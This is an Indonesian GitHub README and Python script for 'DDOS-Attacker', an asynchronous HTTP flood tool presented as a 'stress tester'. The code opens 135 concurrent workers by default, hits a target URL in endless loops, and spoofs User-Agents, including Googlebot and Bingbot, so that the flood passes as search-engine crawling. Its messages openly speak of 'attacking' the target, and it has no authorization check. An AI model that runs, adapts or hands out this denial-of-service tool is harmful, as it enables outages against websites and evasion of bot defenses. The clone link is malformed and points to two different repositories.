# ⚡ DDOS-Attacker: Advanced Web Stress Tester

DDOS-Attacker adalah alat uji beban (*stress testing*) berbasis CLI (Command Line Interface) berkecepatan tinggi yang ditulis dalam bahasa Python. Alat ini memanfaatkan arsitektur *asynchronous* (`aiohttp`) untuk mensimulasikan trafik padat ke server web guna menguji ketahanan infrastruktur dari serangan siber tipe Denial of Service.

Dilengkapi dengan fitur **Dynamic User-Agent Spoofing**, alat ini mengacak identitas *request* (meniru Googlebot, Bingbot, Chrome, Safari, dll.) agar pengujian terasa lebih riil dan menantang bagi sistem pengamanan server.

---

## ✨ Fitur Utama

* **High Performance Async Engine:** Menggunakan `asyncio` untuk performa maksimal tanpa memakan banyak resource RAM lokal.
* **Turbo Mode Configuration (`-t`):** Mengatur intensitas *concurrent workers* (koneksi simultan) secara fleksibel via terminal.
* **Dynamic Bot Spoofing:** Mengacak puluhan *User-Agent* (Browser populer & Search Engine Crawler) secara otomatis pada setiap tembakan.
* **Real-time Latency & Status Logging:** Menampilkan status kode HTTP dan waktu respon server secara langsung.

---

## 🚀 Prasyarat & Instalasi

Pastikan komputer Anda sudah terpasang Python versi 3.7 ke atas.

1. **Clone Repositori ini:**
   ```bash
   git clone [https://github.com/mikaelkristian56/ddos.git](https://github.com/username-lu/ddos-attacker.git)
   cd ddos
python ddos.py -s url -t turbo
import asyncio
import aiohttp
import sys
import argparse
import time
import random

HEADER = """
===================================================
   HAMMER-CLONE: WEB STRESS TESTER (BOT MODE)    
===================================================
"""

# Daftar User-Agent tiruan (Browser populer & Search Engine Bot)
USER_AGENTS = [
    # Chrome & Firefox (Windows / Mac)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    # Mobile (iPhone / Android)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    # Search Engine Bots (Biar dikira bot index Google/Bing)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
]

async def attack_worker(session, url, worker_id):
    """Worker yang menembak target dengan User-Agent acak secara continuous."""
    request_count = 0
    while True:
        try:
            # Mengambil User-Agent secara acak setiap kali melakukan request
            random_ua = random.choice(USER_AGENTS)
            headers = {
                'User-Agent': random_ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            }
            
            start_time = time.time()
            async with session.get(url, headers=headers, timeout=5) as response:
                latency = time.time() - start_time
                request_count += 1
                
                # Biar rapi, kita singkat nama User-Agent yang tampil di log terminal
                ua_short = random_ua.split(') ')[-1] if ')' in random_ua else random_ua[:20]
                
                print(f"[Worker {worker_id} | Req {request_count}] Status: {response.status} | Latency: {latency:.4f}s | UA: {ua_short}")
                
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[Worker {worker_id}] Server Gagal Merespon: {e}")
            # Jeda pendek jika terjadi error beruntun agar komputer lokal tidak overload
            await asyncio.sleep(0.5)

async def main():
    print(HEADER)
    
    parser = argparse.ArgumentParser(description="Python Web Stress Tester - Hammer Style with Bot Spoofing")
    parser.add_argument('-s', '--server', required=True, help="Target URL website (contoh: https://target.com)")
    parser.add_argument('-t', '--turbo', type=int, default=135, help="Jumlah koneksi simultan / Turbo (default: 135)")
    
    args = parser.parse_args()
    
    target_url = args.server
    turbo_speed = args.turbo
    
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print("[-] Error: URL harus diawali dengan http:// atau https://")
        sys.exit(1)
        
    print(f"[*] Menyerang Target : {target_url}")
    print(f"[*] Mode Turbo       : {turbo_speed} workers")
    print(f"[*] Total Bot/UA     : {len(USER_AGENTS)} variasi bot aktif")
    print("[*] Tekan Ctrl+C untuk menghentikan serangan.\n")
    print("Memulai simulasi bot dalam 3 detik...")
    await asyncio.sleep(3)

    connector = aiohttp.TCPConnector(limit=turbo_speed, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(1, turbo_speed + 1):
            task = asyncio.create_task(attack_worker(session, target_url, i))
            tasks.append(task)
            
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print("\n[-] Serangan dihentikan oleh pengguna.")
        finally:
            for task in tasks:
                task.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Keluar dari program.")
